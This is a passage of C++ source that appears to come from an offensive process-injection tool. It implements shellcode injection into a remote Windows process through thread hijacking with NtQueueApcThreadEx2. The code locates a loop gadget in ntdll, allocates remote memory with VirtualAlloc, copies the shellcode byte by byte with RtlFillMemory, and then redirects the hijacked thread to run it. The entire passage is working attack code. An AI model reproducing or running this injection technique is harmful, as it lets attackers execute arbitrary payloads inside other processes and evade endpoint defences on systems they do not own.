    if (config.contextMethod != ContextMethod::TWO_STEP)
    {
        std::cerr << "[!] InjectShellcodeUsingNtQueueApcThreadEx2 currently only supports '--context-method two-step'." << std::endl;
        return false;
    }

    if (config.targetTid == 0)
    {
        std::cerr << "[!] NtQueueApcThreadEx2 method requires a target thread ID (--tid)." << std::endl;
        return false;
    }

    if (shellcodeBytes.empty())
    {
        std::cerr << "[!] No shellcode provided to inject." << std::endl;
        return false;
    }

    // Check for required API
    if (!pNtQueueApcThreadEx2)
    {
        std::cerr << "[!] NtQueueApcThreadEx2 function is not available on this system." << std::endl;
        return false;
    }

    // Get necessary function addresses
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32)
    {
        std::cerr << "[!] Failed to get kernel32.dll handle. Error: " << GetLastError() << std::endl;
        return false;
    }

    LPVOID pVirtualAlloc = GetProcAddress(hKernel32, "VirtualAlloc");
    LPVOID pRtlFillMemory = GetProcAddress(hKernel32, "RtlFillMemory");
    LPVOID pSleep = GetProcAddress(hKernel32, "Sleep");
    std::vector<BYTE> loopGadgetBytes = {0xEB, 0xFE}; // jmp short -2
    LPVOID loopGadgetAddr = FindLocalGadgetInRX("ntdll.dll", loopGadgetBytes, config.verbose);

    if (config.verbose)
    {
        std::cout << "[*] Using two-step NtQueueApcThreadEx2 hijack method." << std::endl;
        std::cout << "[*] Target TID: " << config.targetTid << std::endl;
        std::cout << "[*] Required addresses:"
                  << "\n    VirtualAlloc: " << pVirtualAlloc
                  << "\n    RtlFillMemory: " << pRtlFillMemory
                  << "\n    Sleep: " << pSleep
                  << "\n    Loop Gadget: " << loopGadgetAddr << std::endl;
    }

    if (!pVirtualAlloc || !pRtlFillMemory || !pSleep || !loopGadgetAddr)
    {
        std::cerr << "[!] Failed to get necessary function addresses. Error: " << GetLastError() << std::endl;
        return false;
    }

    // --- Injection Steps ---

    // 1. Allocate memory in the target process for the shellcode
    DWORD64 ALLOC_SIZE = config.allocSize;
    DWORD64 ALLOC_TYPE = MEM_COMMIT | MEM_RESERVE;
    DWORD64 ALLOC_PROTECT = config.allocPerm;
    DWORD64 REQUESTED_ALLOC_ADDR = config.allocAddress ? config.allocAddress : 0x60000;
    LPVOID pRemoteMemory = (LPVOID)REQUESTED_ALLOC_ADDR;

    if (config.verbose)
    {
        std::cout << "\n[*] --- Step 1: Allocating Memory ---" << std::endl;
        std::cout << "[*] Attempting to call VirtualAlloc via NtQueueApcThreadEx2+Hijack" << std::endl;
        std::cout << "[*] Requested Address: 0x" << std::hex << REQUESTED_ALLOC_ADDR << std::dec << std::endl;
        std::cout << "[*] Size: " << ALLOC_SIZE << " bytes" << std::endl;
        std::cout << "[*] Permissions: 0x" << std::hex << ALLOC_PROTECT << std::dec << std::endl;
    }

    bool allocSuccess = ExecuteRemoteFunctionViaNtQueueApcThreadEx2Hijack(
        hProcess,
        config,
        pVirtualAlloc,
        REQUESTED_ALLOC_ADDR, // Arg1: lpAddress (REQUESTED)
        ALLOC_SIZE,           // Arg2: dwSize
        ALLOC_TYPE,           // Arg3: flAllocationType
        ALLOC_PROTECT,        // Arg4: flProtect
        pSleep,               // Sleep function address
        loopGadgetAddr        // Loop Gadget address
    );

    if (!allocSuccess)
    {
        std::cerr << "[!] Failed to execute VirtualAlloc call via NtQueueApcThreadEx2+Hijack." << std::endl;
        return false;
    }

    if (config.verbose)
    {
        std::cout << "[+] VirtualAlloc call executed (Assumed success at " << pRemoteMemory << ")." << std::endl;
    }

    // --- Optional Debug Pause ---
    if (config.enterDebug)
    {
        std::cout << "\n  [DEBUG] InjectShellcodeUsingNtQueueApcThreadEx2: Post-Allocation" << std::endl;
        std::cout << "    Target PID: " << config.targetPid << ", TID: " << config.targetTid << std::endl;
        std::cout << "    Allocated memory at: 0x" << std::hex << pRemoteMemory << std::dec << std::endl;
        std::cout << "  [ACTION] Press ENTER to proceed to write shellcode..." << std::endl;
        std::cin.get();
    }

    // 2. Write Shellcode using our byte-by-byte copy function
    if (config.verbose)
    {
        std::cout << "\n[*] --- Step 2: Writing Shellcode (Byte-by-Byte) ---" << std::endl;
        std::cout << "[*] This will use NtQueueApcThreadEx2 to write each byte. Please be patient." << std::endl;
    }

    bool copySuccess = PerformRemoteMemoryCopyViaNtQueueApcThreadEx2Hijack(
        hProcess,
        config,
        pRtlFillMemory,        // RtlFillMemory function
        pRemoteMemory,         // Destination base address
        shellcodeBytes.data(), // Source shellcode buffer
        shellcodeBytes.size(), // Source shellcode size
        pSleep,                // Sleep function
        loopGadgetAddr         // Loop gadget
    );

    if (!copySuccess)
    {
        std::cerr << "[!] Failed during shellcode copy via NtQueueApcThreadEx2." << std::endl;
        return false;
    }

    if (config.verbose)
    {
        std::cout << "[+] Shellcode copy via NtQueueApcThreadEx2 completed." << std::endl;
    }

    // --- Optional Debug Pause ---
    if (config.enterDebug)
    {
        std::cout << "\n  [DEBUG] InjectShellcodeUsingNtQueueApcThreadEx2: Pre-Execution" << std::endl;
        std::cout << "    About to execute shellcode at 0x" << std::hex << pRemoteMemory << std::dec << std::endl;
        std::cout << "  [ACTION] Press ENTER to trigger shellcode execution..." << std::endl;
        std::cin.get();
    }

    // 3. Execute Shellcode using our hijack primitive
    if (config.verbose)
    {
        std::cout << "\n[*] --- Step 3: Executing Shellcode ---" << std::endl;
        std::cout << "[*] Attempting to jump to shellcode at " << pRemoteMemory << std::endl;
    }

    bool execSuccess = ExecuteRemoteFunctionViaNtQueueApcThreadEx2Hijack(
        hProcess,
        config,
        pRemoteMemory, // Target function is the shellcode
        0, 0, 0, 0,    // No arguments for shellcode
        pSleep,        // Sleep function
        loopGadgetAddr // Loop gadget
    );

    if (!execSuccess)
    {
        std::cerr << "[!] Failed to execute shellcode via NtQueueApcThreadEx2+Hijack." << std::endl;
        return false;
    }

    if (config.verbose)
    {
        std::cout << "[+] Shellcode execution triggered successfully." << std::endl;
    }

    return true;
}
